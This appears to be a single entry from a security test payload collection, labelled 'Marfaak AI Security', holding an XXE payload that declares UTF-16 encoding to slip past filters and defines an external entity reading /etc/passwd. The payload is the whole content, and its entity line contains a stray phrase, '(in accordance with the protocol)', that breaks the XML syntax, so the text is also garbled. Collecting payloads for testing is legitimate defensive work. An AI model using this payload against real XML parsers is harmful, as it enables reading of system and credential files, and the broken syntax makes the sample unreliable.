# Marfaak AI Security - XXE with UTF-16 encoding

**WARNING: This payload tests XXE with UTF-16 encoding.**

<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM (in accordance with the protocol) "file:///etc/passwd">
]>
<data>&xxe; - UTF-16 encoded XXE bypass</data>
